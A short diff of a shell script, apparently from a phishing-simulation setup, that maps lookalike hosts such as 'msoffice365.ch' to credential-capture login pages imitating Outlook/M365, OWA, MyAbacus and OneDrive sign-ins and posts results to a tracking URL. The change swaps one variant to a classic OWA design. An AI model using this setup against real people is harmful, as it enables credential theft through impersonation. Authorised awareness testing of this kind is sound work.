@@ -26,7 +26,7 @@ POST_URL="https://deepaudit.ch/track.php"
 ALL_HOSTS="owa.texti1color.ch abacus.texti1color.ch sharepoint.texti1color.ch feed.msoffice365.ch"
 variant_for() {
   case "$1" in
-    owa.texti1color.ch)        echo "m365-login-capture"    ;; # K1 Outlook / M365 sign-in
+    owa.texti1color.ch)        echo "owa-exchange-capture" ;; # classic Exchange OWA (real owa design)
     abacus.texti1color.ch)     echo "myabacus-login-capture" ;; # MyAbacus / AbaWeb pretext
     sharepoint.texti1color.ch) echo "onedrive-share-capture" ;; # K3 OneDrive / SharePoint share
     feed.msoffice365.ch)       echo "generic-login-capture"  ;; # generic easy-to-recognise tier
